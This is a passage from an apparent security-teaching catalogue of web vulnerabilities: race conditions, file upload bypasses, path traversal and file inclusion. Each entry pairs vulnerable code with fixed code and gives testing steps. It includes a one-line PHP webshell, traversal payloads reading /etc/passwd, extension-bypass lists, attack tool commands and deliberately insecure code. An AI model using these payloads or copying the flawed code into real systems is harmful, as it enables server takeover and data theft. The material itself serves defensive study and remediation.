      "by most passive scanners (Burp Suite, OWASP ZAP, securityheaders-style tools); " +
      "token-revocation-on-logout and idle-timeout behavior require scripted workflow " +
      "testing (capture-token, logout, replay-token) since they depend on multi-step " +
      "application state rather than a single request/response pattern.",
    manual_testing: [
      "Capture a valid authenticated session token/cookie",
      "Log out through the application's normal UI flow",
      "Replay the previously captured token directly against a protected endpoint and confirm whether it is rejected",
      "Inspect the session cookie's attributes in the browser DevTools or raw HTTP response for HttpOnly, Secure, and SameSite",
      "Leave a session idle and periodically check whether it eventually expires and requires re-authentication (test both idle and absolute/maximum session lifetime)",
      "Log in from two separate browsers/devices simultaneously and check whether the application surfaces any concurrent-session visibility or control to the user"
    ],
    remediation:
      "Implement true server-side session invalidation on logout: for opaque server-side " +
      "session stores this is straightforward (delete the session record); for stateless " +
      "JWTs, maintain a lightweight revocation list (or use short-lived access tokens paired " +
      "with revocable refresh tokens) so logout has real effect. Set HttpOnly, Secure, and " +
      "an appropriate SameSite value on all session cookies. Enforce both idle and absolute " +
      "session timeouts appropriate to the application's sensitivity. Offer users visibility " +
      "into and control over their active sessions/devices, and provide a 'log out " +
      "everywhere' capability for suspected compromise scenarios.",
    references: [
      "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html",
      "https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  {
    id: "race-condition-toctou",
    name: "Race Conditions / Time-of-Check to Time-of-Use (TOCTOU)",
    category: "Business Logic",
    cwe: "CWE-367",
    owasp_category: "A04:2021 - Insecure Design",
    description:
      "Race condition vulnerabilities occur when an application checks a condition (account " +
      "balance, coupon usage count, inventory level, whether an action has already been " +
      "performed) and then acts on that check as two logically separate, non-atomic steps, " +
      "with a window between them during which concurrent requests can interleave and both " +
      "pass the check before either has applied its effect. In modern web applications, " +
      "sending many identical requests in rapid, near-simultaneous succession (single-packet " +
      "attack techniques minimize network jitter to maximize the race window at the server) " +
      "can reliably trigger this window even for operations that appear instantaneous in " +
      "normal single-request testing.\n\n" +
      "Classic exploitable examples include: redeeming a single-use discount coupon multiple " +
      "times by submitting many redemption requests simultaneously before any of them " +
      "commits the 'already used' flag; withdrawing/transferring funds beyond an account's " +
      "actual balance by racing concurrent withdrawal requests against a balance check that " +
      "is not performed atomically with the deduction; and bypassing a rate limiter " +
      "implemented with a check-then-increment pattern that is not itself atomic.",
    impact:
      "Financial fraud via balance/limit bypass (withdrawing more than available balance, " +
      "applying a coupon many times, purchasing items below cost via inventory " +
      "race exploitation); bypassing one-time-use restrictions (redeeming referral bonuses " +
      "repeatedly); circumventing rate limits and account lockout mechanisms entirely.",
    examples: [
      {
        title: "Coupon redemption checked and applied as two separate database operations",
        vulnerable_code:
          "app.post('/redeem-coupon', requireAuth, async (req, res) => {\n" +
          "  const coupon = await db.coupons.findOne({ code: req.body.code });\n" +
          "  if (!coupon || coupon.used) {\n" +
          "    return res.status(400).json({ error: 'Invalid or already used coupon' });\n" +
          "  }\n" +
          "  // window between the check above and the update below allows concurrent requests through\n" +
          "  await applyDiscount(req.session.userId, coupon.amount);\n" +
          "  await db.coupons.update({ code: coupon.code }, { used: true });\n" +
          "  res.json({ message: 'Coupon applied' });\n" +
          "});",
        fixed_code:
          "app.post('/redeem-coupon', requireAuth, async (req, res) => {\n" +
          "  // Atomic conditional update: only one concurrent request can succeed in\n" +
          "  // flipping used=false -> used=true; findOneAndUpdate is atomic at the DB level\n" +
          "  const coupon = await db.coupons.findOneAndUpdate(\n" +
          "    { code: req.body.code, used: false },\n" +
          "    { $set: { used: true, usedAt: new Date(), usedBy: req.session.userId } },\n" +
          "    { returnDocument: 'after' }\n" +
          "  );\n" +
          "  if (!coupon) {\n" +
          "    return res.status(400).json({ error: 'Invalid or already used coupon' });\n" +
          "  }\n" +
          "  await applyDiscount(req.session.userId, coupon.amount);\n" +
          "  res.json({ message: 'Coupon applied' });\n" +
          "});",
        explanation:
          "An attacker fires 50 simultaneous redemption requests for the same single-use " +
          "coupon code; because the check (coupon.used === false) and the write " +
          "(setting used: true) are two separate round trips, many of the concurrent " +
          "requests read used: false before any of them has committed the update, so all of " +
          "them pass the check and the discount is applied dozens of times. The fix collapses " +
          "check-and-update into a single atomic database operation (a conditional " +
          "findOneAndUpdate that only matches and flips documents still in the used: false " +
          "state), guaranteeing the database engine itself serializes concurrent attempts so " +
          "only one can ever win the race."
      }
    ],
    detection_methods: [
      "Identify operations with a plausible check-then-act pattern (single-use codes, balance-dependent transfers, inventory decrements, rate-limit counters)",
      "Send many identical requests to the suspected endpoint in as close to true parallel as possible and observe whether the intended single-execution/limit invariant is violated",
      "Use HTTP/2 single-packet attack techniques or precisely synchronized request grouping (e.g. via Burp Suite's Turbo Intruder) to minimize network jitter and maximize the race window"
    ],
    tools: ["Burp Suite Turbo Intruder (race condition attack templates)", "Burp Suite Repeater's 'Send group in parallel' feature", "custom async scripting (Python asyncio/aiohttp, Node.js Promise.all)"],
    automated_testing:
      "Burp Suite's Turbo Intruder extension ships a race-condition attack template that " +
      "uses HTTP/2 single-packet techniques (or last-byte-synchronization for HTTP/1.1) to " +
      "fire a burst of near-simultaneous requests with minimal jitter, dramatically " +
      "increasing the odds of hitting a narrow race window compared to naive sequential or " +
      "loosely-parallel scripted requests.",
    manual_testing: [
      "Identify candidate endpoints implementing single-use, balance-limited, or counted operations",
      "Capture a legitimate request in Burp Repeater/Turbo Intruder and configure a burst of 20-50 near-simultaneous duplicate requests",
      "Send the burst and compare the number of successful executions against the expected limit (e.g. did a single-use coupon apply more than once, did a withdrawal exceed the account balance)",
      "If no race is observed, try refining timing (single-packet HTTP/2 attack, last-byte synchronization) since some races require very tight synchronization to trigger reliably",
      "Test across different operation types systematically: financial transactions, promotional code redemption, inventory/stock decrements, and rate-limit/lockout counters"
    ],
    remediation:
      "Perform check-then-act sequences as a single atomic database operation wherever " +
      "possible (conditional updates, UPDATE ... WHERE with the precondition baked in, " +
      "SELECT ... FOR UPDATE row-level locking within a transaction). Use database-level " +
      "unique constraints to enforce single-use invariants at the schema level as a backstop " +
      "(e.g. a unique constraint on a coupon-redemption join table keyed by user+coupon). " +
      "For distributed/high-concurrency scenarios, use a distributed lock (Redis-based " +
      "SETNX/Redlock) around the critical section, or move to an idempotency-key-based design " +
      "for client-retried operations like payments.",
    references: [
      "https://portswigger.net/web-security/race-conditions",
      "https://cwe.mitre.org/data/definitions/367.html"
    ],
    difficulty: "Hard",
    commonness: "Common"
  },

  // ===========================================================================
  // FILE HANDLING
  // ===========================================================================

  {
    id: "file-upload-unrestricted",
    name: "Unrestricted File Upload",
    category: "Configuration",
    cwe: "CWE-434",
    owasp_category: "A04:2021 - Insecure Design",
    description:
      "Unrestricted file upload occurs when an application allows users to upload files " +
      "without adequately validating file type, content, size, or destination, allowing an " +
      "attacker to upload a server-side executable script (a PHP/JSP/ASPX webshell) into a " +
      "web-accessible directory and then request it directly to achieve remote code " +
      "execution. Weak validation approaches commonly bypassed include: checking only the " +
      "client-supplied Content-Type header (trivially spoofed), checking only the file " +
      "extension via a blocklist (incomplete, since alternate executable extensions like " +
      ".phtml, .php5, .pht are often missed), and validating the extension without " +
      "validating that the actual file content matches an expected format.\n\n" +
      "Beyond direct webshell upload, unrestricted upload also enables other attack classes: " +
      "uploading HTML/SVG files that execute stored XSS when viewed, uploading files that " +
      "exhaust disk space (denial of service), uploading files with path traversal in their " +
      "filename to write outside the intended upload directory, and uploading malware for " +
      "distribution to other users via a file-sharing feature.",
    impact:
      "Remote code execution if an executable script reaches a web-accessible, " +
      "script-executing directory; stored XSS via uploaded HTML/SVG; malware hosting and " +
      "distribution; denial of service via disk exhaustion; in combination with path " +
      "traversal in the filename, arbitrary file write outside the intended directory.",
    examples: [
      {
        title: "PHP avatar upload validating only the client-supplied MIME type",
        vulnerable_code:
          "<?php\n" +
          "$upload = $_FILES['avatar'];\n" +
          "if (in_array($upload['type'], ['image/jpeg', 'image/png'])) { // client-controlled header\n" +
          "    $dest = '/var/www/html/uploads/' . $upload['name']; // original filename used directly\n" +
          "    move_uploaded_file($upload['tmp_name'], $dest);\n" +
          "    echo json_encode(['url' => '/uploads/' . $upload['name']]);\n" +
          "}\n" +
          "?>",
        fixed_code:
          "<?php\n" +
          "$upload = $_FILES['avatar'];\n" +
          "$allowedExts = ['jpg', 'jpeg', 'png', 'gif', 'webp'];\n" +
          "$finfo = finfo_open(FILEINFO_MIME_TYPE);\n" +
          "$actualMime = finfo_file($finfo, $upload['tmp_name']); // inspects actual file content\n" +
          "$allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];\n\n" +
          "$ext = strtolower(pathinfo($upload['name'], PATHINFO_EXTENSION));\n" +
          "if (!in_array($ext, $allowedExts, true) || !in_array($actualMime, $allowedMimes, true)) {\n" +
          "    http_response_code(400);\n" +
          "    exit(json_encode(['error' => 'Invalid file type']));\n" +
          "}\n" +
          "if ($upload['size'] > 5 * 1024 * 1024) {\n" +
          "    http_response_code(400);\n" +
          "    exit(json_encode(['error' => 'File too large']));\n" +
          "}\n" +
          "// Re-encode the image to strip any embedded payload/metadata and guarantee\n" +
          "// the output is a genuine raster image, not just a file with an image magic number\n" +
          "$img = imagecreatefromstring(file_get_contents($upload['tmp_name']));\n" +
          "if ($img === false) {\n" +
          "    http_response_code(400);\n" +
          "    exit(json_encode(['error' => 'Corrupt or invalid image']));\n" +
          "}\n" +
          "$newName = bin2hex(random_bytes(16)) . '.png'; // random name, fixed extension\n" +
          "$dest = '/var/www/uploads-storage/' . $newName; // stored OUTSIDE the web root\n" +
          "imagepng($img, $dest);\n" +
          "echo json_encode(['url' => '/serve-upload?id=' . $newName]);\n" +
          "?>",
        explanation:
          "The vulnerable code trusts the client-supplied Content-Type header entirely (an " +
          "attacker simply sets it to image/jpeg regardless of actual content) and saves the " +
          "file under its original, attacker-chosen filename directly inside the web root, so " +
          "uploading shell.phtml with a spoofed image/jpeg content-type places a fully " +
          "executable PHP webshell at a guessable, directly requestable URL. The fix inspects " +
          "the file's actual content via finfo (magic-byte detection, not the client header), " +
          "re-encodes the image through GD to guarantee the output is genuinely a raster image " +
          "with any embedded payload stripped, generates a random filename with a " +
          "server-controlled extension, and stores the result entirely outside the " +
          "web-servable directory tree, served instead through a controlled download endpoint."
      }
    ],
    detection_methods: [
      "Attempt to upload files with executable extensions relevant to the backend stack (.php, .phtml, .jsp, .asp, .aspx) disguised with spoofed Content-Type and/or valid-looking magic bytes prepended",
      "Test double extensions and case variations (.php.jpg, .PHP, .pHp) and null-byte tricks (shell.php%00.jpg) against older/misconfigured parsers",
      "After any successful upload, attempt to directly request the uploaded file's URL and observe whether it executes as a script rather than being served as a static file",
      "Test whether uploaded files are stored inside a web-servable directory at all, and whether that directory has script execution disabled at the web server level"
    ],
    tools: ["Burp Suite", "fuxploider (automated file upload vulnerability scanner)", "manual crafted polyglot/webshell files"],
    automated_testing:
      "fuxploider automates discovery and exploitation of file upload vulnerabilities: " +
      "`python3 fuxploider.py --url https://target/upload --not-regex \"error\"` fuzzes " +
      "extension bypasses, content-type spoofing, and double-extension tricks, then attempts " +
      "to confirm remote code execution by requesting the uploaded file and checking for " +
      "expected output.",
    manual_testing: [
      "Identify all file upload features and determine the expected file type(s) and where uploaded files are ultimately served from",
      "Upload a minimal webshell (e.g. <?php system($_GET['c']); ?>) with the target extension directly to test baseline validation",
      "If blocked, iterate through bypass techniques: alternate executable extensions (.phtml, .php5, .pht, .phar), double extensions (.php.jpg), null byte tricks, uppercase/mixed-case extensions, and content-type header spoofing",
      "Test polyglot files that are simultaneously valid as an allowed format (e.g. a GIF) and as an executable script, which can defeat magic-byte-only validation combined with a permissive web server extension handling rule",
      "If an upload succeeds, attempt to directly access the file at its resulting URL and confirm whether it executes server-side or is merely served as static content",
      "Test path traversal in the filename field itself (../../shell.php) to see if the destination directory can be escaped"
    ],
    remediation:
      "Validate uploaded file content by actual magic bytes/structure (not the client-supplied " +
      "Content-Type header or file extension alone), ideally by re-processing the file " +
      "through a trusted library appropriate to its type (re-encoding images, re-serializing " +
      "documents) to strip any embedded payload. Store uploaded files outside the web root " +
      "or in a storage location/bucket with script execution explicitly disabled, and serve " +
      "them through an application-controlled endpoint rather than direct static file " +
      "serving. Generate random server-side filenames rather than trusting client-supplied " +
      "names. Enforce file size limits and antivirus/malware scanning where appropriate. " +
      "Configure the web server to never execute scripts from the upload directory " +
      "regardless of extension, as a final defense-in-depth layer.",
    references: [
      "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
      "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
    ],
    difficulty: "Easy",
    commonness: "Common"
  },

  {
    id: "file-upload-polyglot",
    name: "File Upload: Polyglot File Bypass",
    category: "Configuration",
    cwe: "CWE-434",
    owasp_category: "A04:2021 - Insecure Design",
    description:
      "A polyglot file is a single file that is simultaneously valid under two or more " +
      "different file format specifications -- for example a file that is a syntactically " +
      "valid GIF image (satisfying magic-byte and even full structural validation as an " +
      "image) while also containing valid, executable PHP code that a script interpreter " +
      "will happily execute if the file is ever requested through a PHP-processing context. " +
      "This defeats validation approaches that check file content/structure (a meaningful " +
      "improvement over extension/MIME-type checks alone) but still allow the file to be " +
      "stored with, or later served through, an executable extension or context.\n\n" +
      "The classic construction is a GIF89a header followed immediately by " +
      "<?php ... ?> code: the GIF header satisfies image-format validators (including many " +
      "magic-byte checks and even some image-processing libraries, which will simply ignore " +
      "trailing non-image bytes), while the embedded PHP tags execute normally if a PHP " +
      "interpreter processes the file. This technique is also used to bypass image " +
      "re-encoding defenses in some cases by embedding the payload within EXIF metadata " +
      "chunks that certain re-encoding libraries preserve.",
    impact:
      "Bypasses content-validation defenses that naive developers believe are sufficient " +
      "(magic-byte checking without re-encoding), leading to the same remote code execution " +
      "impact as basic unrestricted file upload once the polyglot file is placed in, or " +
      "later moved/served from, an executable context.",
    examples: [
      {
        title: "Upload validator checking only the leading magic bytes, not full structural validity",
        vulnerable_code:
          "<?php\n" +
          "$data = file_get_contents($_FILES['avatar']['tmp_name']);\n" +
          "$gifMagic = \"GIF89a\";\n" +
          "if (substr($data, 0, 6) === $gifMagic) { // only checks the first 6 bytes\n" +
          "    $dest = '/var/www/html/uploads/' . uniqid() . '.gif';\n" +
          "    file_put_contents($dest, $data);\n" +
          "}\n" +
          "// Elsewhere, a misconfigured web server or .htaccess rewrite processes\n" +
          "// .gif requests under certain legacy PHP handler configurations\n" +
          "?>",
        fixed_code:
          "<?php\n" +
          "$data = file_get_contents($_FILES['avatar']['tmp_name']);\n" +
          "$img = @imagecreatefromstring($data); // fails on anything that isn't a genuine, fully-decodable image\n" +
          "if ($img === false) {\n" +
          "    http_response_code(400);\n" +
          "    exit(json_encode(['error' => 'Invalid image']));\n" +
          "}\n" +
          "// Re-encode from the DECODED PIXEL DATA, discarding the original file bytes\n" +
          "// entirely -- any trailing/embedded PHP payload cannot survive this because\n" +
          "// the output is generated fresh from the raster data, not copied from input\n" +
          "$dest = '/var/www/uploads-storage/' . bin2hex(random_bytes(16)) . '.png';\n" +
          "imagepng($img, $dest);\n" +
          "imagedestroy($img);\n" +
          "?>",
        explanation:
          "The vulnerable validator only inspects the first 6 bytes for the GIF magic " +
          "string, so an attacker crafts a file beginning with GIF89a followed by " +
          "<?php system($_GET['c']); ?> -- it passes the magic-byte check and, if server " +
          "misconfiguration or an included .htaccess rewrite causes .gif files to be " +
          "processed by the PHP interpreter (or if a separate LFI vulnerability includes the " +
          "file), the embedded PHP executes. The fix fully decodes the image via GD's " +
          "imagecreatefromstring() (which fails outright on non-image trailing content in " +
          "many cases, and more importantly is only used as a gate) and, critically, " +
          "re-encodes a brand-new output file purely from the decoded pixel data rather than " +
          "writing any of the original uploaded bytes to disk, so no injected payload bytes " +
          "can possibly survive into the stored file."
      }
    ],
    detection_methods: [
      "Craft polyglot files combining a valid image header with embedded script code and test whether upload validation accepts them",
      "Test whether uploaded files are re-encoded/re-processed (defeating polyglots) versus stored as raw uploaded bytes (vulnerable)",
      "Test whether any code path (a separate LFI, a misrouted static file handler, an .htaccess include) could cause an uploaded 'image' to be interpreted as a script"
    ],
    tools: ["exiftool / manual hex editing (for polyglot construction)", "Burp Suite", "fuxploider"],
    automated_testing:
      "Polyglot bypass testing is largely manual/craft-based rather than tool-automated: " +
      "construct candidate polyglot files with a hex editor or exiftool metadata injection, " +
      "then submit them through fuzzing tools like fuxploider alongside standard bypass " +
      "techniques to test the full range of validation weaknesses in one pass.",
    manual_testing: [
      "Determine whether the target validates file content via magic bytes only, full structural parsing, or full re-encoding",
      "Construct a polyglot combining an allowed format's magic bytes/header with an embedded script payload appropriate to the backend language",
      "Upload the polyglot and, if accepted, attempt to trigger script execution through every reachable code path (direct URL request, any LFI/include vulnerability, any feature that reprocesses stored files)",
      "If the polyglot is rejected, test whether re-encoding is actually happening (compare uploaded and stored file bytes/hash) versus merely a stricter structural validation that a more sophisticated polyglot might still defeat"
    ],
    remediation:
      "Never trust file content validation based on magic bytes or partial structural " +
      "checks alone; fully decode and then re-encode uploaded media through a trusted " +
      "library so the stored file is generated fresh from validated data rather than " +
      "persisting any of the original uploaded bytes. Strip EXIF and other metadata during " +
      "re-encoding, since some libraries otherwise preserve attacker-controlled metadata " +
      "chunks verbatim. Ensure the web server never executes scripts from the storage " +
      "directory under any circumstance, as a final backstop independent of upload " +
      "validation quality.",
    references: [
      "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload",
      "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html"
    ],
    difficulty: "Hard",
    commonness: "Uncommon"
  },

  {
    id: "file-upload-double-extension",
    name: "File Upload: Double Extension and Extension Blocklist Bypass",
    category: "Configuration",
    cwe: "CWE-434",
    owasp_category: "A04:2021 - Insecure Design",
    description:
      "Many upload validators rely on a blocklist of dangerous extensions (.php, .jsp, " +
      ".asp, .exe) rather than an allowlist of permitted ones, and blocklists are reliably " +
      "incomplete and bypassable. Double-extension attacks exploit web server extension " +
      "handling quirks: a file named shell.php.jpg may be blocked by an extension-suffix " +
      "check that only inspects the final extension incorrectly (matching .jpg and allowing " +
      "it through), while some legacy Apache configurations using mod_mime's multiple-" +
      "extension handling will still execute it as PHP because Apache processes handler " +
      "directives for *any* recognized extension found anywhere in a multi-dotted filename, " +
      "not just the last one.\n\n" +
      "Related bypasses include alternate executable extensions the blocklist forgot " +
      "(.phtml, .php3/4/5/7, .pht, .phar for PHP; .jspx, .jsw, .jsv for Java), case " +
      "variation on case-insensitive filesystems (.PHP, .PhP), trailing special characters " +
      "or whitespace that some validators strip inconsistently between the check and the " +
      "actual save operation, and appending a null byte or other terminator historically " +
      "exploitable in older PHP versions (largely patched in modern PHP but still relevant " +
      "against legacy systems).",
    impact:
      "Identical RCE impact to unrestricted file upload; specifically defeats naive " +
      "blocklist-based extension filtering that a developer may have believed was adequate, " +
      "highlighting why allowlist-based validation is the only reliable approach.",
    examples: [
      {
        title: "Node.js upload handler using an extension blocklist instead of an allowlist",
        vulnerable_code:
          "const path = require('path');\n" +
          "const BLOCKED_EXTENSIONS = ['.php', '.jsp', '.asp', '.exe', '.sh'];\n\n" +
          "app.post('/upload', upload.single('file'), (req, res) => {\n" +
          "  const ext = path.extname(req.file.originalname).toLowerCase();\n" +
          "  if (BLOCKED_EXTENSIONS.includes(ext)) {\n" +
          "    return res.status(400).json({ error: 'File type not allowed' });\n" +
          "  }\n" +
          "  fs.renameSync(req.file.path, `./public/uploads/${req.file.originalname}`);\n" +
          "  res.json({ url: `/uploads/${req.file.originalname}` });\n" +
          "});",
        fixed_code:
          "const path = require('path');\n" +
          "const crypto = require('crypto');\n" +
          "const ALLOWED_EXTENSIONS = ['.jpg', '.jpeg', '.png', '.gif', '.pdf'];\n" +
          "const ALLOWED_MIMES = { '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.png': 'image/png', '.gif': 'image/gif', '.pdf': 'application/pdf' };\n\n" +
          "app.post('/upload', upload.single('file'), async (req, res) => {\n" +
          "  const ext = path.extname(req.file.originalname).toLowerCase();\n" +
          "  const detectedType = await fileTypeFromFile(req.file.path); // sniffs real content, e.g. via file-type package\n" +
          "  if (\n" +
          "    !ALLOWED_EXTENSIONS.includes(ext) ||\n" +
          "    !detectedType ||\n" +
          "    ALLOWED_MIMES[ext] !== detectedType.mime\n" +
          "  ) {\n" +
          "    return res.status(400).json({ error: 'File type not allowed' });\n" +
          "  }\n" +
          "  const safeName = crypto.randomBytes(16).toString('hex') + ext; // discard original name entirely\n" +
          "  fs.renameSync(req.file.path, `/var/uploads-storage/${safeName}`); // outside the web root\n" +
          "  res.json({ id: safeName });\n" +
          "});",
        explanation:
          "The blocklist check on the final extension only correctly rejects a file literally " +
          "named shell.php, but is bypassed entirely by shell.phtml, shell.php5, or " +
          "shell.PHP (case mismatch against a case-sensitive Array.includes check), any of " +
          "which may still be handler-mapped to the PHP interpreter by the web server. " +
          "Additionally, since the original filename is preserved and reused for storage, " +
          "any double-extension trick that Apache's multi-extension handler resolves as PHP " +
          "(shell.php.jpg under certain legacy AddHandler configurations) also succeeds. The " +
          "fix switches to an explicit allowlist of permitted extensions cross-checked " +
          "against real content-type sniffing, and discards the original filename entirely " +
          "in favor of a randomly generated one with a single, server-chosen extension, " +
          "eliminating both the blocklist-completeness problem and any multi-extension " +
          "handler ambiguity."
      }
    ],
    detection_methods: [
      "Test the full range of alternate executable extensions relevant to the identified backend language, not just the primary one (.php variants: .phtml, .php3-7, .pht, .phar; Java: .jspx, .jsw, .jsv, .jsp;)",
      "Test double-extension combinations (shell.php.jpg, shell.jpg.php) and case variations",
      "Identify the specific web server and version in use and research known extension-handling quirks (legacy Apache AddHandler/mod_mime multi-extension behavior, IIS short-name 8.3 tricks)"
    ],
    tools: ["fuxploider", "Burp Suite Intruder with an extension-bypass wordlist", "manual testing against the identified web server"],
    automated_testing:
      "fuxploider includes a comprehensive built-in wordlist of alternate/double extensions " +
      "and automatically iterates through them against the target upload endpoint, " +
      "reporting which variants were accepted and attempting to confirm code execution on " +
      "any that succeed.",
    manual_testing: [
      "Fingerprint the backend language and web server to determine the relevant set of alternate executable extensions",
      "Systematically test each alternate extension variant, double-extension combination, and case variation against the upload endpoint",
      "For any accepted upload, determine the actual storage filename (which may differ from the submitted name) and attempt to request it directly to confirm execution",
      "Research and test any web-server-specific multi-extension handling quirks relevant to the identified server version"
    ],
    remediation:
      "Replace extension blocklists with a strict allowlist of permitted extensions " +
      "combined with real content-type sniffing (magic bytes or full re-encoding, not the " +
      "extension alone). Always generate the stored filename server-side rather than " +
      "preserving any part of the client-supplied name, eliminating multi-extension and " +
      "case-variation ambiguity entirely. Keep web server extension-handler configuration " +
      "minimal and explicit, avoiding legacy multi-extension AddHandler directives that can " +
      "cause unexpected files to be executed.",
    references: [
      "https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html",
      "https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  {
    id: "path-traversal",
    name: "Path Traversal / Directory Traversal",
    category: "Access Control",
    cwe: "CWE-22",
    owasp_category: "A01:2021 - Broken Access Control",
    description:
      "Path traversal occurs when an application uses user-supplied input to construct a " +
      "filesystem path without properly neutralizing sequences (../, ..\\, their URL-encoded " +
      "or double-encoded forms %2e%2e%2f, %2e%2e%5c, or absolute paths) that let the " +
      "attacker escape the intended base directory and reference arbitrary files elsewhere " +
      "on the filesystem. It commonly affects file-serving endpoints (download features, " +
      "static asset servers with a filename parameter, template/theme loaders, log viewers, " +
      "and file-based caching systems) that concatenate user input directly into a path " +
      "passed to a file-read (or, more dangerously, file-write) function.\n\n" +
      "Read-based path traversal discloses arbitrary files readable by the application " +
      "process (source code, configuration files with embedded credentials, /etc/passwd, " +
      "SSH keys). Write-based path traversal (traversal in a filename used for saving an " +
      "uploaded or generated file) is significantly more severe, as it can overwrite " +
      "application code, cron jobs, or configuration files, potentially leading directly to " +
      "remote code execution.",
    impact:
      "Disclosure of arbitrary readable files (application source code and secrets, system " +
      "configuration, credential files, SSH private keys); when write-capable, arbitrary " +
      "file overwrite that can lead to remote code execution (overwriting a web-accessible " +
      "script, a cron job definition, or an application configuration file).",
    examples: [
      {
        title: "Node.js file-download endpoint building a path from a filename query parameter",
        vulnerable_code:
          "app.get('/download', (req, res) => {\n" +
          "  const filename = req.query.file;\n" +
          "  const filePath = path.join(__dirname, 'user-files', filename); // no normalization check\n" +
          "  res.sendFile(filePath);\n" +
          "});",
        fixed_code:
          "app.get('/download', (req, res) => {\n" +
          "  const filename = req.query.file || '';\n" +
          "  const baseDir = path.join(__dirname, 'user-files');\n" +
          "  const requestedPath = path.normalize(path.join(baseDir, filename));\n" +
          "  // Resolve to an absolute path and verify it is still inside baseDir\n" +
          "  if (!requestedPath.startsWith(path.resolve(baseDir) + path.sep)) {\n" +
          "    return res.status(400).json({ error: 'Invalid filename' });\n" +
          "  }\n" +
          "  if (!/^[a-zA-Z0-9._-]+$/.test(filename)) { // additionally allowlist the filename format\n" +
          "    return res.status(400).json({ error: 'Invalid filename' });\n" +
          "  }\n" +
          "  res.sendFile(requestedPath);\n" +
          "});",
        explanation:
          "path.join() does NOT sanitize traversal sequences -- it simply concatenates and " +
          "normalizes path segments, so a request to " +
          "/download?file=../../../../etc/passwd resolves outside the intended user-files " +
          "directory and discloses the system password file (or, on the application server, " +
          "potentially source files containing database credentials). The fix resolves the " +
          "final path to an absolute form and explicitly verifies it still falls within the " +
          "intended base directory (a containment check, not just normalization) and " +
          "additionally validates the filename against a strict character allowlist as a " +
          "second, independent layer of defense."
      }
    ],
    detection_methods: [
      "Inject ../ sequences (and their URL-encoded, double-encoded, and backslash variants) into any parameter that appears to reference a filename or path",
      "Target well-known absolute file paths (/etc/passwd on Linux, C:\\Windows\\win.ini on Windows) as a straightforward proof of successful traversal",
      "Test null-byte injection (file.txt%00.jpg) against older/legacy language runtimes where string truncation at the null byte could bypass extension-suffix checks"
    ],
    tools: ["Burp Suite Intruder (with a path-traversal payload wordlist)", "DotDotPwn", "wfuzz"],
    automated_testing:
      "DotDotPwn is purpose-built for path traversal fuzzing: " +
      "`perl dotdotpwn.pl -m http-url -u \"https://target/download?file=TRAVERSAL\" -k " +
      "\"root:\"` iterates through depth levels, encoding variants, and OS-specific payloads, " +
      "checking each response for a signature string (root: for /etc/passwd) confirming " +
      "successful traversal.",
    manual_testing: [
      "Identify every parameter that references a filename, path, or resource identifier resolved to a file",
      "Inject a range of traversal depths (../, ../../, ../../../, etc.) targeting a well-known file appropriate to the suspected OS",
      "Test URL-encoded (%2e%2e%2f) and double-URL-encoded (%252e%252e%252f) variants, since some middleware normalizes once and misses double-encoded payloads",
      "Test backslash variants (..\\) for Windows-hosted applications, and mixed slash/backslash combinations",
      "If the base path is appended to (not prepended before) the traversal, test payload placement at both the start and within the parameter value",
      "For any file-write functionality (upload destination, export/report generation), specifically test whether traversal in the filename can write outside the intended directory"
    ],
    remediation:
      "Never build filesystem paths by directly concatenating user input. Resolve the final " +
      "path to its canonical absolute form and explicitly verify it remains within the " +
      "intended base directory before use (a containment check performed after resolution, " +
      "not merely stripping ../ substrings, which is bypassable via encoding and repetition " +
      "tricks). Additionally validate filenames against a strict allowlist pattern " +
      "disallowing path separators and traversal sequences entirely. Where feasible, avoid " +
      "taking a filename from user input at all -- use an opaque, server-generated identifier " +
      "mapped internally to the real file location instead.",
    references: [
      "https://owasp.org/www-community/attacks/Path_Traversal",
      "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html",
      "https://cwe.mitre.org/data/definitions/22.html"
    ],
    difficulty: "Easy",
    commonness: "Very Common"
  },

  {
    id: "lfi-rfi",
    name: "Local File Inclusion (LFI) and Remote File Inclusion (RFI)",
    category: "Injection",
    cwe: "CWE-98",
    owasp_category: "A03:2021 - Injection",
    description:
      "LFI/RFI are specific to languages/frameworks (most commonly PHP, but also older JSP " +
      "and classic ASP patterns) that support dynamically including and executing code from " +
      "a file path built from user input, such as PHP's include(), require(), " +
      "include_once(), and require_once(). LFI occurs when the included path is a local " +
      "file reachable via path traversal, allowing an attacker to include arbitrary local " +
      "files -- if a local file the attacker can also write to or influence (an uploaded " +
      "image containing embedded PHP, a log file containing attacker-controlled request " +
      "data such as a crafted User-Agent) is included, LFI escalates directly to remote code " +
      "execution via a technique called 'LFI to RCE via log poisoning' or 'PHP session " +
      "file inclusion'.\n\n" +
      "RFI is the more directly dangerous variant: if PHP's allow_url_include setting is " +
      "enabled (disabled by default since PHP 5.2 but still found in legacy/misconfigured " +
      "environments), the include path can be a full URL, letting an attacker host a " +
      "malicious PHP script on their own server and have the target application fetch and " +
      "execute it directly with a single request -- immediate remote code execution with no " +
      "further chaining required.",
    impact:
      "RFI: immediate, trivial remote code execution. LFI: local file disclosure, and RCE " +
      "when chained with log poisoning, session file inclusion, uploaded file inclusion, or " +
      "PHP wrapper abuse (php://filter for base64-encoded source disclosure, " +
      "php://input or data:// for direct code execution in vulnerable configurations).",
    examples: [
      {
        title: "PHP page-template loader vulnerable to both LFI and, if misconfigured, RFI",
        vulnerable_code:
          "<?php\n" +
          "$page = $_GET['page'] ?? 'home';\n" +
          "include($page . '.php'); // page is fully attacker-controlled\n" +
          "?>",
        fixed_code:
          "<?php\n" +
          "$allowedPages = ['home', 'about', 'contact', 'faq'];\n" +
          "$page = $_GET['page'] ?? 'home';\n" +
          "if (!in_array($page, $allowedPages, true)) {\n" +
          "    http_response_code(404);\n" +
          "    exit('Page not found');\n" +
          "}\n" +
